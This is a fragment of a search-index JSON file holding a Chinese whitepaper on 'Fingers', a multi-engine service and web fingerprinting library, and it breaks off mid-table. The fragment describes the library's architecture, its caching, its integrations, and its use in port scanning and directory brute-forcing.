\u591a\u5f15\u64ce\u6307\u7eb9\u8bc6\u522b\u7cfb\u7edf\u6b63\u662f\u4e3a\u6ee1\u8db3\u8fd9\u4e9b\u9700\u6c42\u800c\u8bbe\u8ba1\u7684\u521b\u65b0\u89e3\u51b3\u65b9\u6848\u3002</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6280\u672f\u67b6\u6784","title":"\u6280\u672f\u67b6\u6784","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u8bbe\u8ba1\u7406\u5ff5","title":"\u8bbe\u8ba1\u7406\u5ff5","text":"<p>Fingers \u7684\u8bbe\u8ba1\u56f4\u7ed5\u4e09\u5927\u6838\u5fc3\u7ef4\u5ea6\u5c55\u5f00\uff0c\u8fd9\u4e09\u4e2a\u7ef4\u5ea6\u5b9a\u4e49\u4e86\u73b0\u4ee3\u6307\u7eb9\u8bc6\u522b\u7cfb\u7edf\u7684\u53d1\u5c55\u65b9\u5411\uff1a</p> <ol> <li> <p>\u5d4c\u5165\u5f0f\u4f18\u5148\u67b6\u6784    \u5c06\u6307\u7eb9\u8bc6\u522b\u8bbe\u8ba1\u4e3a\u5d4c\u5165\u5f0f\u5e93\uff0c\u901a\u8fc7SDK\u3001API\u3001ABI\u591a\u91cd\u63a5\u53e3\u652f\u6301\u5404\u79cd\u96c6\u6210\u573a\u666f\u3002\u5d4c\u5165\u5f0f\u67b6\u6784\u662f\u6307\u7eb9\u8bc6\u522b\u7684\u6700\u4f73\u5b9e\u8df5\uff0c\u76f8\u6bd4\u72ec\u7acb\u5de5\u5177\u8c03\u7528\uff0c\u5d4c\u5165\u5f0f\u96c6\u6210\u80fd\u591f\u63d0\u4f9b\u6781\u9ad8\u7684API\u6548\u7387\uff0c\u907f\u514d\u8fdb\u7a0b\u95f4\u901a\u4fe1\u5f00\u9500\uff0c\u5b9e\u73b0\u6beb\u79d2\u7ea7\u7684\u54cd\u5e94\u65f6\u95f4\u3002</p> </li> <li> <p>\u573a\u666f\u5316\u89e3\u51b3\u65b9\u6848    \u4e0d\u4ec5\u63d0\u4f9b\u5e95\u5c42\u6307\u7eb9\u8bc6\u522b\u80fd\u529b\uff0c\u66f4\u9488\u5bf9\u5b9e\u6218\u4e2d\u7684\u5177\u4f53\u573a\u666f\u63d0\u4f9b\u5b8c\u6574\u89e3\u51b3\u65b9\u6848\u3002\u7279\u522b\u9488\u5bf9\u7aef\u53e3\u626b\u63cf\u548c\u76ee\u5f55\u7206\u7834\u4e24\u5927\u6838\u5fc3\u573a\u666f\uff0c\u63d0\u4f9b\u6df1\u5ea6\u4f18\u5316\u7684\u6307\u7eb9\u8bc6\u522b\u7b56\u7565\u548c\u5de5\u4f5c\u6d41\u7a0b\uff0c\u8ba9\u6307\u7eb9\u8bc6\u522b\u771f\u6b63\u670d\u52a1\u4e8e\u5b9e\u9645\u5b89\u5168\u5de5\u4f5c\u3002</p> </li> <li> <p>\u5f00\u653e\u751f\u6001\u7cfb\u7edf    \u901a\u8fc7\u7ee7\u627f\u591a\u4e2a\u793e\u533a\u6307\u7eb9\u5e93\uff0c\u5e76\u63d0\u4f9b\u5b8c\u6574\u7684\u7b2c\u4e09\u65b9\u6269\u5c55\u673a\u5236\uff0c\u6784\u5efa\u5f00\u653e\u7684\u6307\u7eb9\u8bc6\u522b\u751f\u6001\u3002\u652f\u6301\u793e\u533a\u5f00\u53d1\u8005\u8d21\u732e\u6307\u7eb9\u89c4\u5219\uff0c\u4f01\u4e1a\u7528\u6237\u5b9a\u5236\u4e13\u6709\u6307\u7eb9\u5e93\uff0c\u5b9e\u73b0\u6307\u7eb9\u8bc6\u522b\u80fd\u529b\u7684\u6301\u7eed\u6f14\u8fdb\u548c\u6269\u5c55\u3002</p> </li> </ol>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u67b6\u6784\u6982\u8ff0","title":"\u67b6\u6784\u6982\u8ff0","text":"<p>Fingers \u91c7\u7528\u6a21\u5757\u5316\u7684\u591a\u5f15\u64ce\u67b6\u6784\uff0c\u6838\u5fc3\u7ec4\u4ef6\u5305\u62ec\uff1a</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5f15\u64ce\u7ba1\u7406\u5c42","title":"\u5f15\u64ce\u7ba1\u7406\u5c42","text":"<ul> <li>\u5f15\u64ce\u6ce8\u518c\u4e2d\u5fc3\uff1a\u52a8\u6001\u6ce8\u518c\u548c\u7ba1\u7406\u5404\u79cd\u6307\u7eb9\u5f15\u64ce</li> <li>\u8d1f\u8f7d\u5747\u8861\u5668\uff1a\u667a\u80fd\u5206\u914d\u8bc6\u522b\u4efb\u52a1\uff0c\u4f18\u5316\u6027\u80fd</li> <li>\u7ed3\u679c\u805a\u5408\u5668\uff1a\u5408\u5e76\u591a\u5f15\u64ce\u7ed3\u679c\uff0c\u53bb\u91cd\u5e76\u6807\u51c6\u5316\u8f93\u51fa</li> </ul>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6307\u7eb9\u5f15\u64ce\u5c42","title":"\u6307\u7eb9\u5f15\u64ce\u5c42","text":"<ul> <li>Fingers \u539f\u751f\u5f15\u64ce\uff1a\u652f\u6301\u6700\u4e30\u5bcc\u7279\u6027\u7684\u81ea\u7814\u6307\u7eb9\u5e93</li> <li>Wappalyzer \u5f15\u64ce\uff1aWeb\u6280\u672f\u6808\u8bc6\u522b\u7684\u4e1a\u754c\u6807\u51c6</li> <li>FingerprintHub \u5f15\u64ce\uff1a\u793e\u533a\u9a71\u52a8\u7684\u7efc\u5408\u6307\u7eb9\u5e93</li> <li>EHole \u5f15\u64ce\uff1a\u56fd\u4ea7\u5316\u5e94\u7528\u4e13\u9879\u4f18\u5316</li> <li>Goby \u5f15\u64ce\uff1a\u5546\u4e1a\u7ea7\u6307\u7eb9\u8bc6\u522b\u80fd\u529b</li> <li>Nmap \u5f15\u64ce\uff1aTCP\u670d\u52a1\u8bc6\u522b\u7684\u6743\u5a01\u6807\u51c6\uff08\u90e8\u5206\u652f\u6301\uff09</li> </ul>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6570\u636e\u5904\u7406\u5c42","title":"\u6570\u636e\u5904\u7406\u5c42","text":"<p>\u6570\u636e\u5904\u7406\u5c42\u662f\u6574\u4e2a\u7cfb\u7edf\u7684\u6838\u5fc3\uff0c\u8d1f\u8d23\u4ece\u539f\u59cb\u7f51\u7edc\u54cd\u5e94\u4e2d\u63d0\u53d6\u6709\u4ef7\u503c\u7684\u6307\u7eb9\u4fe1\u606f\u3002\u534f\u8bae\u89e3\u6790\u5668\u91c7\u7528\u6d41\u5f0f\u89e3\u6790\u6280\u672f\uff0c\u80fd\u591f\u9ad8\u6548\u5904\u7406HTTP/HTTPS\u3001TCP\u3001UDP\u7b49\u591a\u79cd\u7f51\u7edc\u534f\u8bae\u7684\u54cd\u5e94\u6570\u636e\u3002\u5185\u5bb9\u63d0\u53d6\u5668\u57fa\u4e8e\u591a\u7ef4\u5ea6\u7279\u5f81\u63d0\u53d6\u7b97\u6cd5\uff0c\u4e0d\u4ec5\u80fd\u591f\u4ece\u54cd\u5e94\u5934\u548c\u9875\u9762\u5185\u5bb9\u4e2d\u8bc6\u522b\u663e\u6027\u7279\u5f81\uff0c\u8fd8\u80fd\u591f\u901a\u8fc7favicon\u54c8\u5e0c\u3001\u9875\u9762\u7ed3\u6784\u5206\u6790\u7b49\u6280\u672f\u53d1\u73b0\u9690\u6027\u7279\u5f81\u3002\u7248\u672c\u5206\u6790\u5668\u8fd0\u7528\u81ea\u7136\u8bed\u8a00\u5904\u7406\u548c\u6a21\u5f0f\u8bc6\u522b\u6280\u672f\uff0c\u80fd\u591f\u4ece\u9519\u8bef\u9875\u9762\u3001\u6ce8\u91ca\u4fe1\u606f\u3001\u9759\u6001\u8d44\u6e90\u8def\u5f84\u7b49\u591a\u4e2a\u89d2\u5ea6\u667a\u80fd\u63d0\u53d6\u7248\u672c\u53f7\u548c\u6280\u672f\u6808\u4fe1\u606f\u3002</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6807\u51c6\u5316\u5c42","title":"\u6807\u51c6\u5316\u5c42","text":"<p>\u6807\u51c6\u5316\u5c42\u89e3\u51b3\u4e86\u4f20\u7edf\u6307\u7eb9\u8bc6\u522b\u4e2d\u6700\u5927\u7684\u75db\u70b9\u2014\u2014\u4e0d\u540c\u6307\u7eb9\u5e93\u95f4\u7684\u6570\u636e\u6807\u51c6\u4e0d\u7edf\u4e00\u95ee\u9898\u3002CPE\u6620\u5c04\u5668\u57fa\u4e8eNIST\u6807\u51c6\u5b9e\u73b0\u4e86\u4ece\u79c1\u6709\u683c\u5f0f\u5230\u901a\u7528\u6807\u51c6\u7684\u65e0\u7f1d\u8f6c\u6362\uff0c\u4e3a\u540e\u7eed\u7684\u6f0f\u6d1e\u5173\u8054\u548c\u98ce\u9669\u8bc4\u4f30\u5960\u5b9a\u4e86\u6570\u636e\u57fa\u7840\u3002\u522b\u540d\u89e3\u6790\u5668\u91c7\u7528\u4e86\u8bed\u4e49\u76f8\u4f3c\u5ea6\u7b97\u6cd5\u548c\u4eba\u5de5\u667a\u80fd\u6280\u672f\uff0c\u80fd\u591f\u81ea\u52a8\u8bc6\u522b\u4e0d\u540c\u6307\u7eb9\u5e93\u4e2d\u540c\u4e00\u4ea7\u54c1\u7684\u4e0d\u540c\u547d\u540d\u65b9\u5f0f\uff0c\u5982\u5c06\"\u7528\u53cbNC\"\u548c\"yonyou nc\"\u6b63\u786e\u5173\u8054\u3002\u7f6e\u4fe1\u5ea6\u8bc4\u4f30\u7cfb\u7edf\u57fa\u4e8e\u8d1d\u53f6\u65af\u6982\u7387\u6a21\u578b\uff0c\u7efc\u5408\u8003\u8651\u591a\u4e2a\u5f15\u64ce\u7684\u8bc6\u522b\u7ed3\u679c\u3001\u5339\u914d\u5f3a\u5ea6\u3001\u5386\u53f2\u51c6\u786e\u7387\u7b49\u56e0\u7d20\uff0c\u4e3a\u6bcf\u4e2a\u8bc6\u522b\u7ed3\u679c\u8ba1\u7b97\u53ef\u4fe1\u5ea6\u8bc4\u5206\u3002</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6838\u5fc3\u6280\u672f\u7279\u6027","title":"\u6838\u5fc3\u6280\u672f\u7279\u6027","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u591a\u6a21\u5f0f\u8bc6\u522b\u6280\u672f\u8def\u7ebf","title":"\u591a\u6a21\u5f0f\u8bc6\u522b\u6280\u672f\u8def\u7ebf","text":"<p>Fingers\u91c7\u7528\u4e86\u9769\u547d\u6027\u7684\u591a\u6a21\u5f0f\u8bc6\u522b\u6280\u672f\u67b6\u6784\uff0c\u4ece\u6839\u672c\u4e0a\u89e3\u51b3\u4e86\u4f20\u7edf\u6307\u7eb9\u8bc6\u522b\u5de5\u5177\u5728\u6548\u7387\u548c\u51c6\u786e\u6027\u4e4b\u95f4\u96be\u4ee5\u5e73\u8861\u7684\u95ee\u9898\u3002\u88ab\u52a8\u8bc6\u522b\u6a21\u5f0f\u901a\u8fc7\u5206\u6790\u76ee\u6807\u7cfb\u7edf\u7684\u81ea\u7136\u54cd\u5e94\u6765\u63d0\u53d6\u6307\u7eb9\u7279\u5f81\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5177\u6709\u9690\u853d\u6027\u5f3a\u3001\u5bf9\u76ee\u6807\u7cfb\u7edf\u5f71\u54cd\u5c0f\u7684\u4f18\u52bf\uff0c\u7279\u522b\u9002\u7528\u4e8e\u5bf9OPSEC\u8981\u6c42\u8f83\u9ad8\u7684\u6e17\u900f\u6d4b\u8bd5\u573a\u666f\u3002\u7cfb\u7edf\u901a\u8fc7\u6df1\u5ea6\u5206\u6790HTTP\u54cd\u5e94\u5934\u7684\u7ec6\u5fae\u5dee\u5f02\u3001\u9875\u9762\u7ed3\u6784\u7684\u7279\u5f81\u6a21\u5f0f\u3001\u4ee5\u53ca\u9519\u8bef\u4fe1\u606f\u7684\u8868\u8fbe\u65b9\u5f0f\uff0c\u80fd\u591f\u5728\u4e0d\u53d1\u9001\u989d\u5916\u8bf7\u6c42\u7684\u60c5\u51b5\u4e0b\u83b7\u5f97\u4e30\u5bcc\u7684\u6307\u7eb9\u4fe1\u606f\u3002</p> <p>\u4e3b\u52a8\u8bc6\u522b\u6a21\u5f0f\u5219\u901a\u8fc7\u53d1\u9001\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u63a2\u9488\u8bf7\u6c42\u6765\u83b7\u53d6\u66f4\u8be6\u7ec6\u7684\u7cfb\u7edf\u4fe1\u606f\u3002\u8fd9\u4e9b\u63a2\u9488\u57fa\u4e8e\u5927\u91cf\u7684\u5b9e\u6218\u7ecf\u9a8c\u548c\u7406\u8bba\u7814\u7a76\uff0c\u80fd\u591f\u89e6\u53d1\u76ee\u6807\u7cfb\u7edf\u66b4\u9732\u7279\u5b9a\u7684\u6280\u672f\u7279\u5f81\u3002\u7cfb\u7edf\u91c7\u7528\u4e86\u667a\u80fd\u63a2\u9488\u9009\u62e9\u7b97\u6cd5\uff0c\u6839\u636e\u521d\u6b65\u8bc6\u522b\u7ed3\u679c\u52a8\u6001\u9009\u62e9\u6700\u6709\u53ef\u80fd\u6210\u529f\u7684\u63a2\u9488\u7ec4\u5408\uff0c\u907f\u514d\u4e86\u4f20\u7edf\u5de5\u5177\"\u5730\u6bef\u5f0f\u8f70\u70b8\"\u7684\u4f4e\u6548\u505a\u6cd5\u3002\u6df7\u5408\u6a21\u5f0f\u901a\u8fc7\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\u52a8\u6001\u5e73\u8861\u88ab\u52a8\u548c\u4e3b\u52a8\u8bc6\u522b\u7684\u6bd4\u91cd\uff0c\u5728\u4fdd\u8bc1\u8bc6\u522b\u51c6\u786e\u6027\u7684\u540c\u65f6\u6700\u5927\u5316\u9690\u853d\u6027\u3002</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u667a\u80fd\u7f13\u5b58\u6280\u672f\u67b6\u6784","title":"\u667a\u80fd\u7f13\u5b58\u6280\u672f\u67b6\u6784","text":"<p>\u7f13\u5b58\u7cfb\u7edf\u662fFingers\u9ad8\u6027\u80fd\u8868\u73b0\u7684\u5173\u952e\u6280\u672f\u57fa\u7840\u3002\u7cfb\u7edf\u8bbe\u8ba1\u4e86\u591a\u5c42\u6b21\u7684\u7f13\u5b58\u67b6\u6784\uff0c\u4ece\u89c4\u5219\u7f16\u8bd1\u7f13\u5b58\u5230\u7ed3\u679c\u5b58\u50a8\u7f13\u5b58\uff0c\u6bcf\u4e00\u5c42\u90fd\u7ecf\u8fc7\u7cbe\u5fc3\u4f18\u5316\u3002\u89c4\u5219\u7f16\u8bd1\u7f13\u5b58\u901a\u8fc7\u9884\u7f16\u8bd1\u6b63\u5219\u8868\u8fbe\u5f0f\u548c\u4f18\u5316\u5339\u914d\u7b97\u6cd5\uff0c\u5c06\u6307\u7eb9\u5339\u914d\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4eceO(n*m)\u4f18\u5316\u5230\u63a5\u8fd1O(1)\u7684\u6c34\u5e73\u3002\u7ed3\u679c\u7f13\u5b58\u7cfb\u7edf\u91c7\u7528\u4e86\u57fa\u4e8e\u5185\u5bb9\u54c8\u5e0c\u7684\u53bb\u91cd\u7b97\u6cd5\uff0c\u80fd\u591f\u667a\u80fd\u8bc6\u522b\u76f8\u540c\u6216\u76f8\u4f3c\u7684\u76ee\u6807\uff0c\u907f\u514d\u91cd\u590d\u8ba1\u7b97\u3002\u5143\u6570\u636e\u7f13\u5b58\u5219\u5b58\u50a8\u4e86CPE\u6620\u5c04\u5173\u7cfb\u3001\u7248\u672c\u4fe1\u606f\u89e3\u6790\u7ed3\u679c\u7b49\u8ba1\u7b97\u5bc6\u96c6\u578b\u6570\u636e\uff0c\u901a\u8fc7\u7a7a\u95f4\u6362\u65f6\u95f4\u7684\u7b56\u7565\u663e\u8457\u63d0\u5347\u4e86\u7cfb\u7edf\u7684\u54cd\u5e94\u901f\u5ea6\u3002</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u9ad8\u6027\u80fd\u4f18\u5316\u7406\u5ff5","title":"\u9ad8\u6027\u80fd\u4f18\u5316\u7406\u5ff5","text":"<p>Fingers\u7684\u6027\u80fd\u4f18\u5316\u9075\u5faa\"\u9884\u6d4b-\u9884\u5904\u7406-\u5e76\u884c\u5316\"\u7684\u4e09\u91cd\u4f18\u5316\u7406\u5ff5\u3002\u9884\u6d4b\u673a\u5236\u901a\u8fc7\u5206\u6790\u76ee\u6807\u7684\u7f51\u7edc\u7279\u5f81\u548c\u54cd\u5e94\u6a21\u5f0f\uff0c\u63d0\u524d\u4f30\u7b97\u6700\u4f18\u7684\u5e76\u53d1\u6570\u548c\u8d85\u65f6\u8bbe\u7f6e\u3002\u9884\u5904\u7406\u673a\u5236\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u5b8c\u6210\u89c4\u5219\u7f16\u8bd1\u3001\u7f13\u5b58\u9884\u70ed\u3001\u8fde\u63a5\u6c60\u521d\u59cb\u5316\u7b49\u8017\u65f6\u64cd\u4f5c\uff0c\u786e\u4fdd\u8fd0\u884c\u65f6\u7684\u6781\u81f4\u6027\u80fd\u3002\u5e76\u884c\u5316\u5904\u7406\u4e0d\u4ec5\u4f53\u73b0\u5728\u591a\u76ee\u6807\u7684\u5e76\u53d1\u8bc6\u522b\u4e0a\uff0c\u66f4\u4f53\u73b0\u5728\u5355\u4e2a\u76ee\u6807\u7684\u591a\u5f15\u64ce\u5e76\u884c\u5904\u7406\u4e0a\uff0c\u901a\u8fc7\u4efb\u52a1\u5206\u89e3\u548c\u7ed3\u679c\u805a\u5408\uff0c\u5b9e\u73b0\u4e86\u771f\u6b63\u610f\u4e49\u4e0a\u7684\u6027\u80fd\u500d\u589e\u3002</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6838\u5fc3\u529f\u80fd","title":"\u6838\u5fc3\u529f\u80fd","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6838\u5fc3\u4f18\u52bf\u4e00\u5d4c\u5165\u5f0f\u67b6\u6784\u7684\u6700\u4f73\u5b9e\u8df5","title":"\u6838\u5fc3\u4f18\u52bf\u4e00\uff1a\u5d4c\u5165\u5f0f\u67b6\u6784\u7684\u6700\u4f73\u5b9e\u8df5","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#api\u6548\u7387\u7684\u9769\u547d\u6027\u63d0\u5347","title":"API\u6548\u7387\u7684\u9769\u547d\u6027\u63d0\u5347","text":"<p>Fingers\u91c7\u7528\u5d4c\u5165\u5f0f\u67b6\u6784\u8bbe\u8ba1\uff0c\u8fd9\u662f\u6307\u7eb9\u8bc6\u522b\u9886\u57df\u7684\u6700\u4f73\u5b9e\u8df5\u3002\u76f8\u6bd4\u4f20\u7edf\u7684\u72ec\u7acb\u5de5\u5177\u8c03\u7528\u65b9\u5f0f\uff0c\u5d4c\u5165\u5f0f\u96c6\u6210\u907f\u514d\u4e86\u8fdb\u7a0b\u95f4\u901a\u4fe1\u3001\u6587\u4ef6I/O\u3001\u6570\u636e\u5e8f\u5217\u5316\u7b49\u5f00\u9500\uff0c\u5b9e\u73b0\u4e86\u771f\u6b63\u7684\u96f6\u5ef6\u8fdf\u6307\u7eb9\u8bc6\u522b\u3002</p> <p>\u5728\u73b0\u4ee3\u5b89\u5168\u5de5\u5177\u4e2d\uff0c\u6307\u7eb9\u8bc6\u522b\u88ab\u5e7f\u6cdb\u5e94\u7528\u4e8e\u626b\u63cf\u5668\u3001\u722c\u866b\u3001\u4ee3\u7406\u5de5\u5177\u3001\u5b89\u5168\u5e73\u53f0\u7b49\u5404\u79cd\u573a\u666f\u3002\u8fd9\u4e9b\u5e94\u7528\u5bf9\u54cd\u5e94\u65f6\u95f4\u6781\u4e3a\u654f\u611f\uff0c\u4f20\u7edf\u7684\u5de5\u5177\u8c03\u7528\u65b9\u5f0f\u5f80\u5f80\u6210\u4e3a\u6027\u80fd\u74f6\u9888\u3002Fingers\u901a\u8fc7\u5d4c\u5165\u5f0f\u5e93\u7684\u5f62\u5f0f\uff0c\u5c06\u6307\u7eb9\u8bc6\u522b\u7684\u8c03\u7528\u5f00\u9500\u964d\u5230\u6700\u4f4e\uff0c\u5355\u6b21\u8bc6\u522b\u64cd\u4f5c\u53ef\u5728\u6beb\u79d2\u7ea7\u5b8c\u6210\u3002</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u591a\u7ef4\u5ea6\u96c6\u6210\u652f\u6301","title":"\u591a\u7ef4\u5ea6\u96c6\u6210\u652f\u6301","text":"<p>Fingers\u63d0\u4f9b\u4e86\u4e1a\u754c\u6700\u5b8c\u6574\u7684\u96c6\u6210\u63a5\u53e3\uff1a - Go SDK\uff1a\u539f\u751fGo\u5e93\u5f62\u5f0f\uff0c\u96f6\u5f00\u9500\u96c6\u6210 - RESTful API\uff1a\u8de8\u8bed\u8a00HTTP\u63a5\u53e3\uff0c\u6807\u51c6\u5316\u8c03\u7528 - ABI\u63a5\u53e3\uff1aC\u517c\u5bb9\u52a8\u6001\u5e93\uff0c\u652f\u6301\u5404\u79cd\u7f16\u7a0b\u8bed\u8a00 - CLI\u5de5\u5177\uff1a\u547d\u4ee4\u884c\u63a5\u53e3\uff0c\u652f\u6301\u811a\u672c\u5316\u8c03\u7528</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5b9e\u6218\u96c6\u6210\u6848\u4f8b","title":"\u5b9e\u6218\u96c6\u6210\u6848\u4f8b","text":"<ul> <li>Gogo\u626b\u63cf\u5668\uff1a\u901a\u8fc7SDK\u96c6\u6210\u5b9e\u73b0\u9ad8\u6548\u7aef\u53e3\u6307\u7eb9\u8bc6\u522b</li> <li>Spray\u7206\u7834\u5de5\u5177\uff1a\u5d4c\u5165\u5f0f\u8c03\u7528\u63d0\u4f9b\u76ee\u5f55\u6307\u7eb9\u5206\u6790</li> <li>\u4f01\u4e1a\u5b89\u5168\u5e73\u53f0\uff1a\u901a\u8fc7API\u63a5\u53e3\u5b9e\u73b0\u5927\u89c4\u6a21\u8d44\u4ea7\u6307\u7eb9\u8bc6\u522b</li> </ul>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6838\u5fc3\u4f18\u52bf\u4e8c\u7aef\u53e3\u626b\u63cf\u4e0e\u76ee\u5f55\u7206\u7834\u7684\u573a\u666f\u5316\u89e3\u51b3\u65b9\u6848","title":"\u6838\u5fc3\u4f18\u52bf\u4e8c\uff1a\u7aef\u53e3\u626b\u63cf\u4e0e\u76ee\u5f55\u7206\u7834\u7684\u573a\u666f\u5316\u89e3\u51b3\u65b9\u6848","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u4e0d\u4ec5\u4ec5\u662f\u5e95\u5c42\u80fd\u529b","title":"\u4e0d\u4ec5\u4ec5\u662f\u5e95\u5c42\u80fd\u529b","text":"<p>Fingers\u4e0d\u6ee1\u8db3\u4e8e\u4ec5\u63d0\u4f9b\u5e95\u5c42\u7684\u6307\u7eb9\u8bc6\u522b\u80fd\u529b\uff0c\u800c\u662f\u9488\u5bf9\u5b9e\u6218\u4e2d\u7684\u6838\u5fc3\u573a\u666f\u63d0\u4f9b\u4e86\u5b8c\u6574\u7684\u89e3\u51b3\u65b9\u6848\u3002\u901a\u8fc7\u6df1\u5ea6\u5206\u6790\u5b89\u5168\u5de5\u4f5c\u4e2d\u6307\u7eb9\u8bc6\u522b\u7684\u5b9e\u9645\u5e94\u7528\u6a21\u5f0f\uff0cFingers\u4e13\u95e8\u4f18\u5316\u4e86\u4e24\u5927\u5173\u952e\u573a\u666f\uff1a</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u7aef\u53e3\u626b\u63cf\u573a\u666f\u4f18\u5316","title":"\u7aef\u53e3\u626b\u63cf\u573a\u666f\u4f18\u5316","text":"<p>\u667a\u80fd\u7aef\u53e3-\u670d\u52a1\u6620\u5c04\uff1a - \u57fa\u4e8e\u7aef\u53e3\u7279\u5f81\u81ea\u52a8\u9009\u62e9\u5408\u9002\u7684\u6307\u7eb9\u89c4\u5219\u96c6 - \u652f\u6301TCP/UDP\u534f\u8bae\u7684\u6df1\u5ea6\u670d\u52a1\u8bc6\u522b - \u63d0\u4f9b\u7aef\u53e3\u5b58\u6d3b\u6027\u68c0\u6d4b\u4e0e\u670d\u52a1\u6307\u7eb9\u8bc6\u522b\u7684\u4e00\u4f53\u5316\u6d41\u7a0b</p> <p>\u9ad8\u5e76\u53d1\u626b\u63cf\u7b56\u7565\uff1a - \u9488\u5bf9\u7aef\u53e3\u626b\u63cf\u7684\u9ad8\u5e76\u53d1\u7279\u70b9\u4f18\u5316\u8bc6\u522b\u6d41\u7a0b - \u652f\u6301\u6279\u91cf\u76ee\u6807\u7684\u5e76\u884c\u6307\u7eb9\u8bc6\u522b - \u667a\u80fd\u8d85\u65f6\u63a7\u5236\u548c\u9519\u8bef\u5904\u7406\u673a\u5236</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u76ee\u5f55\u7206\u7834\u573a\u666f\u4f18\u5316","title":"\u76ee\u5f55\u7206\u7834\u573a\u666f\u4f18\u5316","text":"<p>\u667a\u80fd\u8def\u5f84\u6307\u7eb9\u5206\u6790\uff1a - \u57fa\u4e8eHTTP\u54cd\u5e94\u81ea\u52a8\u5224\u65adWeb\u5e94\u7528\u7c7b\u578b - \u63d0\u4f9b\u76ee\u5f55\u7ed3\u6784\u4e0e\u5e94\u7528\u6307\u7eb9\u7684\u5173\u8054\u5206\u6790 - \u652f\u6301\u9519\u8bef\u9875\u9762\u3001\u9ed8\u8ba4\u9875\u9762\u7b49\u7279\u6b8a\u573a\u666f\u7684\u6307\u7eb9\u63d0\u53d6</p> <p>\u7206\u7834\u7ed3\u679c\u589e\u5f3a\uff1a - \u5c06\u4f20\u7edf\u7684200/404\u7ed3\u679c\u8f6c\u5316\u4e3a\u4e30\u5bcc\u7684\u6307\u7eb9\u4fe1\u606f - \u63d0\u4f9b\u57fa\u4e8e\u6307\u7eb9\u7684\u76ee\u5f55\u4ef7\u503c\u8bc4\u4f30 - \u652f\u6301\u6307\u7eb9\u9a71\u52a8\u7684\u4e0b\u4e00\u6b65\u7206\u7834\u7b56\u7565</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6838\u5fc3\u4f18\u52bf\u4e09\u5f00\u653e\u751f\u6001\u7cfb\u7edf\u4e0e\u591a\u793e\u533a\u6307\u7eb9\u5e93\u7ee7\u627f","title":"\u6838\u5fc3\u4f18\u52bf\u4e09\uff1a\u5f00\u653e\u751f\u6001\u7cfb\u7edf\u4e0e\u591a\u793e\u533a\u6307\u7eb9\u5e93\u7ee7\u627f","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u4e1a\u754c\u6700\u5168\u9762\u7684\u6307\u7eb9\u5e93\u8986\u76d6","title":"\u4e1a\u754c\u6700\u5168\u9762\u7684\u6307\u7eb9\u5e93\u8986\u76d6","text":"<p>Fingers\u7ee7\u627f\u4e86\u591a\u4e2a\u4e3b\u6d41\u793e\u533a\u7684\u6307\u7eb9\u5e93\uff0c\u5b9e\u73b0\u4e86\u4e1a\u754c\u6700\u5e7f\u6cdb\u7684\u6307\u7eb9\u8986\u76d6\uff1a</p> \u6307\u7eb9\u5e93 \u8986\u76d6\u8303\u56f4 \u89c4\u5219\u6570\u91cf \u7279\u8272\u4f18\u52bf Fingers \u539f\u751f \u5168\u6808\u5e94\u7528 4500+ 